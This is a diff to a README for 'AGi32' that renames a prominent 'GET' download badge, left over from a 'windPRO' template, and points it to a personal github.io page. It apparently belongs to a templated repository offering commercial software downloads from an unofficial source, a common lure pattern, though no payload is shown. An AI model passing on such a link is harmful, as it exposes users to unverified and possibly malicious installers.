@@ -1,7 +1,7 @@
 
 # AGi32
 
-[![GET](https://img.shields.io/badge/GET%20%E2%80%94%20windPRO-0078D6?style=for-the-badge&logoColor=white)](https://carolcarteru742.github.io/.github/AGi32)
+[![GET](https://img.shields.io/badge/GET%20%E2%80%94%20AGi32-0078D6?style=for-the-badge&logoColor=white)](https://carolcarteru742.github.io/.github/AGi32)
 
 ![AGi32 Preview](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQgmX2NNQEtLwh9SSwTAmrnttL4ir8MmzthapklRSuR7hiujvGrG5N2kGvc&s=10)
 
